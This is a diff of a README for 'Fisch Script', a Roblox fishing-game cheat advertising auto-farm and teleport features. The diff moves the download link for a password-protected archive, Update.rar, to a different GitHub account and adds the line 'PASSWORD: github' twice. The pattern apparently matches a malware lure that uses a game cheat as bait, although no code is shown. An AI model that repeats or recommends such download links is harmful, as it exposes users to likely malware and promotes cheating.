@@ -1,4 +1,6 @@
-#  **Fisch Script - Best Roblox Script 2025 - Fisch Script Latest Version**  [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/BRobxStik/fisch-script/releases/download/Update/Update.rar)  
+#  **Fisch Script - Best Roblox Script 2025 - Fisch Script Latest Version**  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/BilixTap/fisch-script/releases/download/Update/Update.rar)
+## PASSWORD: github
 
 Welcome to the **Fisch Script** repository! This script is designed to **enhance your fishing adventure** in Roblox by automating tasks, improving efficiency, and unlocking powerful features. Whether you want **auto-farm**, **instant fish catching**, **teleportation**, or **rare fish detection**, this script has everything you need to dominate the waters! 🎣🌊  
 
@@ -6,7 +8,8 @@ Welcome to the **Fisch Script** repository! This script is designed to **enhance
 ![fish](https://github.com/user-attachments/assets/138d99f9-5048-450a-a4b8-a3818acc33bc)
 
  
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/BRobxStik/fisch-script/releases/download/Update/Update.rar)  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/BilixTap/fisch-script/releases/download/Update/Update.rar)  
+## PASSWORD: github
 
 ---  
 
